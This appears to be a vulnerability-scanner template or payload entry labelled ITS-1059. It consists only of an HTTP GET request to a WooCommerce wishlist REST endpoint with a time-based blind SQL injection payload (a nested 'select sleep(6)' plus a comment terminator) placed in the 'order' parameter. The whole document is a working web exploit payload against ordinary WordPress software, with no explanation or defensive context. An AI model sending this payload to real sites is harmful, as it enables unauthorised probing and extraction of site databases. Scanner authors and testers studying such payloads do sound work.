# Vulnerable: ITS-1059
GET /wp-json/wc/v3/wishlist/{{share_key}}/get_products?order=,(select*from(select(sleep(6)))a)--+-
